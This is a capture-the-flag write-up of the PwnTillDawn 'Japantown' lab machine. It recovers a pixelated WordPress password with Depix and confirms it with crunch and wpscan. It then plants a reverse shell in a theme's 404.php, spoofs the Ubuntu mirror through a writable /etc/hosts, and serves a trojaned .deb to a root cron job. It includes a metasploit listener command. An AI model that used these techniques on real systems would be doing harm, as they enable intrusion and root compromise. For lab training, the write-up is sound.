---
layout: post
title: PwnTillDawn - Japantown Write-Up
date: 2024-11-18
classes: wide
description: Depixelating passwords and backdooring debian packages to success!
---

# Japantown (10.150.150.21)

![](/assets/img/post/pwntilldawn_japantown/1.png)

## Initial Scanning

First things first, let's run nmap to see what ports we can explore on the target's machine.

```
$ sudo nmap -sV -sC -oN scans/nmap.txt 10.150.150.21
```

![2](/assets/img/post/pwntilldawn_japantown/2.png)

We can see two open ports being SSH and HTTP, so the reconnaissance process will be quick. As SSH is rarely exploitable in CTFs, the web server is our best bet.



## Web Server Exploration

Turns out the web server is a Wordpress blog with one single post and an about me page.

![](/assets/img/post/pwntilldawn_japantown/3.png)

To avoid missing out important information, I often like to verify the page source-code to find hidden links or comments that might be useful and also reading the `robots.txt` page, if it exists, to identify relevant information, which in this case turns out to be very profitable this time.

![](/assets/img/post/pwntilldawn_japantown/5.png)

The post page contains a flag that we need to complete the challenge. The `robots.txt` page also has juicy information.

![](/assets/img/post/pwntilldawn_japantown/4.png)

Not only this page has a flag but it also show us an important file that we'll be using later on, as we, ironically, don't know what it is for, yet.



## Depix 2 Win

Funny enough, the author of this blog, which is called `kim` thinks posting his blurred password is a cool idea, and tell us that there's a tool that can be used to read the password.

![](/assets/img/post/pwntilldawn_japantown/6.png)

The tool is called **Depix** and it's available on [Github](https://github.com/spipm/Depix). The ideia is taking a blurred image and comparing pixels with a search image to find potential characters that match the blurred ones.

![](/assets/img/post/pwntilldawn_japantown/7.png)

Now remember that one file we found on `robots.txt`? Time to use it. When accessed directly, the image looks broken, but it's in fact Base64 encoded, and once decoded, becomes our search image for this challenge.

```
$ curl -L http://10.150.150.21/blog/wp-content/uploads/2020/12/you-know-what-this-is-for.png | base64 -d | tee searchimage.png
```

![](/assets/img/post/pwntilldawn_japantown/8.png)

So, accordingly to the tool's documentation, we're supposed to crop the image until we have only the pixels of the blurred text and run the tool against it. So we crop the image and we're ready to go.

<img src="/assets/img/post/pwntilldawn_japantown/9.png" style="zoom:300%;" />

> :warning: **Important Note:** It took me a really long time to figure this out, but cropping the image using `gthumb` will mess up the output. Use GIMP instead.

```
$ python depix.py -p password.png -s searchimage.png -o output.png
```

After a short while, we'll get the output with the password, that will not be completly readable, but good enough for us to guess the password.

<img src="/assets/img/post/pwntilldawn_japantown/10.png" alt="10" style="zoom:300%;" />

We can cleary see some of the letter, so the password is something like `kimi**hina4`, so I would guess it's `kiminchina4`? Just to be sure, we can use `crunch` together with `wpscan` to try logging in with this username and identifying the missing letters. Also, if you haven't figured out the username, wpscan can also enumerate and tell you the correct user.

```
$ crunch 11 11 -t kimi@@hina4 -o wordlist.txt
$ wpscan --url http://10.150.150.21/ -U 'kim' -P wordlist.txt
```

![](/assets/img/post/pwntilldawn_japantown/11.png)

We now got confirmation that the password is correct, so we can login as `kim`.



## Initial Access

Soon after compromising the author's account, the next flag can be found in the post page, as a draft.

![](/assets/img/post/pwntilldawn_japantown/12.png)

From now, our objective is to get a shell, which is quite easy actually. Since wordpress is built using PHP, we can either modify a plugin or a page. Also, I'll be using `msfvenom` to generate a shell, but you can also use the famous [Penstestmonkey's PHP reverse shell](https://github.com/pentestmonkey/php-reverse-shell), it works the same.

![](/assets/img/post/pwntilldawn_japantown/13.png)

Next we'll be going to Theme Editor and select the `404.php` page and paste `shell.php` contents inside, since 404 is an easily accessible page. Once we load a non-existent page on the website, we'll get a shell.

> :bulb: **Note:** Remember to start your metasploit or netcat listener otherwise the shell won't connect to your machine.

Once the connection arrives, we can see our current user is `www-data` as expected, what is unexpected tho is the `password_for_www_data` file, which stores a password that we can use to login through SSH. Switching to an SSH connection or not is completely up to you. 

![](/assets/img/post/pwntilldawn_japantown/14.png)

The next flag can also be located easily inside Kim's home directory in `/home/kim`:

![](/assets/img/post/pwntilldawn_japantown/15.png)

Kim's directory also has a `script.sh` that basically does nothing but lure you for a while until you realize it's a dead end. At this point I've decided to use [LinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS) to run the privilege escalation checks for me and found some interesting information.



## Not So Secure, eh?

First, by monitoring frequent cron jobs, we can identify that the machine is downloading a debian package and installing it every minute.

![](/assets/img/post/pwntilldawn_japantown/16.png)

Second, we have write permissions on the `/etc/hosts` file, which can be used for DNS Spoofing.

![](/assets/img/post/pwntilldawn_japantown/17.png)

Knowing this, we can attempt to trick the machine into downloading a malicious package instead. So we'll edit the `/etc/hosts` file and add a new line using the following command:

```
$ echo "<IP> de.archive.ubuntu.com" >> /etc/hosts
```

![](/assets/img/post/pwntilldawn_japantown/18.png)

So now, whenever the machine tries to download the package, it will download our malicious package instead. The next step is to serve the package.

> :bulb: **Note:** You'll need to craft your package. Doing so it really easy and quick, but the commands may vary from OS, so here's a tutorial from [OffSec](https://www.offsec.com/metasploit-unleashed/binary-linux-trojan/) on how to do so and also a [tool](https://github.com/UndeadSec/Debinject) for Python2.7 to automate the process. Remember to use the same name.

Once the package is ready, all we've gotta do is replicate the URL path, serve the package and wait.

```
$ ls ubuntu/pool/main/o/openssh/ssh_8.2p1-4_all.deb
ubuntu/pool/main/o/openssh/ssh_8.2p1-4_all.deb
$ sudo python -m http.server 80
```

As before, I've used `msfvenom` to create the reverse shell. So it's time to start a listener.

```
$ msfconsole -q -x "use exploit/multi/handler;set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST <IP>; set LPORT 443; run -j"
```

![](/assets/img/post/pwntilldawn_japantown/19.png)

With the session opened message, we can access the last flag inside root's home directory.

![](/assets/img/post/pwntilldawn_japantown/20.png)
